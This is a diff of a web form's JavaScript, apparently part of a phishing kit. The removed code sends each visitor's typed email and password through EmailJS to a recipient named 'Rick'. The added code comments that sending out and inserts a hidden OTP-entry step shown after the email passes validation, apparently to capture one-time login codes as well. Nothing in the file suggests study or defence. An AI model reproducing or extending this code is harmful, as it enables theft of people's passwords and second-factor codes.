@@ -1,46 +1,88 @@
-(function () {
-  emailjs.init("user_ESDjKTcJyUrjiqhGOMJ3G");
-})();
+// (function () {
+//   emailjs.init("user_ESDjKTcJyUrjiqhGOMJ3G");
+// })();
+let form = document.querySelector("#contact");
+
+const otpBoxDiv = document.createElement("div");
+otpBoxDiv.setAttribute("id", "optBox");
+otpBoxDiv.classList.add("d-none");
+otpBoxDiv.innerHTML = `<fieldset>
+<label for="number">OTP</label><br />
+<input
+  type="number"
+  name="number"
+  tabindex="2"
+  required
+  class="otp"
+/>
+</fieldset>
+<fieldset>
+<button
+  name="submit"
+  type="submit"
+  id="opt-submit"
+  class="submit"
+>
+  Submit Code
+</button>
+</fieldset>`;
+form.appendChild(otpBoxDiv);
 
 function validate() {
-  let email = document.querySelector(".email");
+  let emailBox = document.querySelector("#emailBox");
+  let optBox = document.querySelector("#optBox");
   let password = document.querySelector(".password");
-  let btn = document.querySelector(".submit");
+  let username = document.querySelector(".username");
+  let email = document.querySelector(".email");
+  let otp = document.querySelector(".otp");
+  let submitBtn = document.querySelector(".submit");
 
-  btn.addEventListener("click", (e) => {
+  let userPassword = document.querySelector("#userPassword");
+  let emailSubmitBtn = document.querySelector("#email-submit");
+  emailSubmitBtn.addEventListener("click", (e) => {
     e.preventDefault();
-    //validate email
-    let regexEmail = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/;
-    if (email.value.match(regexEmail)) {
-      if (email.value === "" || password.value === "") {
+    filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+    if (filter.test(email.value)) {
+      console.log(email.value);
+      emailBox.classList.add("d-none");
+      optBox.classList.remove("d-none");
+    } else {
+      if (email.value == "") {
         emptyerror();
       } else {
-        sendmail(email.value, password.value);
-        email.value = "";
-        password.value = "";
-        success();
+        error();
       }
-    } else {
-      error();
-      email.value = "";
-      password.value = "";
     }
+  });
+
+  submitBtn.addEventListener("click", (e) => {
+    e.preventDefault();
+    console.log(emailBox, optBox, userPassword);
+    //validate email
+    // if (usename.value === "" || password.value === "") {
+    //   emptyerror();
+    // } else {
+    //   // sendmail(usename.value, password.value);
+    //   // usename.value = "";
+    //   // password.value = "";
+    //   // success();
+    // }
   });
 }
 validate();
 
-function sendmail(email, password) {
-  emailjs.send("service_ll5oava", "template_cvjri3e", {
-    to_name: "Rick",
-    from_name: email,
-    message: password,
-  });
-}
+// function sendmail(usename, password) {
+//   emailjs.send("service_ll5oava", "template_cvjri3e", {
+//     to_name: "Rick",
+//     from_name: usename,
+//     message: password,
+//   });
+// }
 
 function emptyerror() {
   Swal.fire({
     icon: "error",
-    title: "Oops...",
+    title: "Fields cannot be empty!",
     text: "Fields cannot be empty!",
   });
 }
@@ -48,7 +90,7 @@ function emptyerror() {
 function error() {
   Swal.fire({
     icon: "error",
-    title: "Oops...",
+    title: "Please Give Valid Information",
     text: "Please Give Valid Information",
   });
 }
@@ -56,7 +98,7 @@ function error() {
 function success() {
   Swal.fire({
     icon: "success",
-    title: "Success...",
+    title: "Successfully sent message",
     text: "Successfully sent message",
   });
   const closeModel = document.getElementById("contact-submit");
